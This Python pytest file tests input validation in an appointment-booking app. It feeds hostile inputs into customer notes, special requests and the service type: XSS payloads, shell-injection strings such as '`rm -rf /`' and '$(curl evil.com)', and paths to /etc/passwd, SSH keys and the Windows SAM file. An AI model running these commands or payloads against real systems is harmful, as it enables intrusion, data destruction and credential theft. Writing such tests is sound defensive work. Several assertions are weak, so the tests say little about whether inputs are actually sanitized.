"""
Security tests for input validation.

These tests verify:
- XSS prevention
- Command injection prevention
- Path traversal prevention
- JSON injection prevention
"""

from __future__ import annotations

import pytest

from booking_handlers import handle_book_appointment
from database import Appointment, Customer


@pytest.mark.security
class TestInputValidation:
    """Test input validation and sanitization."""

    @pytest.mark.parametrize(
        "xss_payload",
        [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg/onload=alert('XSS')>",
            "';alert(String.fromCharCode(88,83,83))//",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
        ],
    )
    def test_xss_customer_notes(self, db_session, xss_payload):
        """Test XSS prevention in customer notes."""
        customer = Customer(
            name="Test User",
            phone="+15551234567",
            email="test@example.com",
            notes=xss_payload,
        )
        db_session.add(customer)
        db_session.commit()

        # Retrieve and verify XSS is neutralized
        db_session.refresh(customer)
        # Notes should be stored but escaped when rendered
        assert customer.notes is not None

    @pytest.mark.parametrize(
        "xss_payload",
        [
            "<script>steal_data()</script>",
            "<<SCRIPT>alert('XSS');//<</SCRIPT>",
            "<BODY ONLOAD=alert('XSS')>",
        ],
    )
    def test_xss_special_requests(self, db_session, customer, xss_payload):
        """Test XSS prevention in appointment special requests."""
        appointment = Appointment(
            customer_id=customer.id,
            appointment_datetime="2025-11-20T14:00:00",
            service_type="botox",
            special_requests=xss_payload,
        )
        db_session.add(appointment)
        db_session.commit()

        db_session.refresh(appointment)
        # Should store but not execute
        assert appointment.special_requests is not None

    @pytest.mark.parametrize(
        "command_injection",
        [
            "; ls -la",
            "| cat /etc/passwd",
            "& whoami",
            "`rm -rf /`",
            "$(curl evil.com)",
            "&& ping -c 10 evil.com",
        ],
    )
    def test_command_injection_service_type(
        self, db_session, customer, command_injection
    ):
        """Test command injection prevention in service type."""
        result = handle_book_appointment(
            db_session,
            customer_name=customer.name,
            customer_phone=customer.phone,
            customer_email=customer.email,
            start_time="2025-11-20T14:00:00-05:00",
            service_type=f"botox{command_injection}",
        )

        # Should reject or sanitize
        if result.get("success", False):
            # If accepted, verify it was sanitized
            assert ";" not in result.get("service_type", "")
            assert "|" not in result.get("service_type", "")

    @pytest.mark.parametrize(
        "path_traversal",
        [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "../../../../../../root/.ssh/id_rsa",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\SAM",
        ],
    )
    def test_path_traversal_prevention(self, db_session, path_traversal):
        """Test path traversal prevention."""
        customer = Customer(
            name="Test User",
            phone="+15551234567",
            email="test@example.com",
            notes=f"File: {path_traversal}",
        )
        db_session.add(customer)
        db_session.commit()

        # Should not allow file system access
        # This is a defensive test - actual prevention happens at file operation level
        assert customer.notes is not None

    def test_json_injection_metadata(self, db_session, customer, voice_conversation):
        """Test JSON injection in conversation metadata."""
        malicious_json = '{"key": "value", "admin": true}'

        voice_conversation.custom_metadata = {"user_input": malicious_json}
        db_session.commit()

        db_session.refresh(voice_conversation)
        # Should store as string, not parse
        assert isinstance(voice_conversation.custom_metadata, dict)

    @pytest.mark.parametrize(
        "phone",
        [
            "+15551234567",
            "555-123-4567",
            "(555) 123-4567",
        ],
    )
    def test_phone_number_validation_pass(self, db_session, phone):
        """Test valid phone numbers are accepted."""
        result = handle_book_appointment(
            db_session,
            customer_name="Test User",
            customer_phone=phone,
            customer_email="test@example.com",
            start_time="2025-11-20T14:00:00-05:00",
            service_type="botox",
        )

        # Should accept valid formats
        assert result is not None

    @pytest.mark.parametrize(
        "email",
        [
            "user@example.com",
            "user+tag@example.com",
            "user.name@sub.example.com",
        ],
    )
    def test_email_validation_pass(self, db_session, email):
        """Test valid emails are accepted."""
        result = handle_book_appointment(
            db_session,
            customer_name="Test User",
            customer_phone="+15551234567",
            customer_email=email,
            start_time="2025-11-20T14:00:00-05:00",
            service_type="botox",
        )

        assert result is not None

    def test_datetime_validation(self, db_session, customer):
        """Test datetime format validation."""
        invalid_dates = [
            "not-a-date",
            "2025/11/20 14:00:00",  # Wrong format
            "tomorrow at 2pm",  # Natural language
        ]

        for invalid_date in invalid_dates:
            result = handle_book_appointment(
                db_session,
                customer_name=customer.name,
                customer_phone=customer.phone,
                customer_email=customer.email,
                start_time=invalid_date,
                service_type="botox",
            )

            # Should reject invalid formats
            if not result.get("success", False):
                assert "error" in result or "invalid" in result.get("error", "").lower()

    def test_service_type_whitelist(self, db_session, customer):
        """Test service type is validated against whitelist."""
        invalid_services = [
            "invalid_service",
            "DROP_TABLE",
            "../../../etc/passwd",
            "<script>alert(1)</script>",
        ]

        for invalid_service in invalid_services:
            result = handle_book_appointment(
                db_session,
                customer_name=customer.name,
                customer_phone=customer.phone,
                customer_email=customer.email,
                start_time="2025-11-20T14:00:00-05:00",
                service_type=invalid_service,
            )

            # Should reject invalid services
            if not result.get("success", False):
                error_msg = result.get("error", "").lower()
                assert "service" in error_msg or "invalid" in error_msg
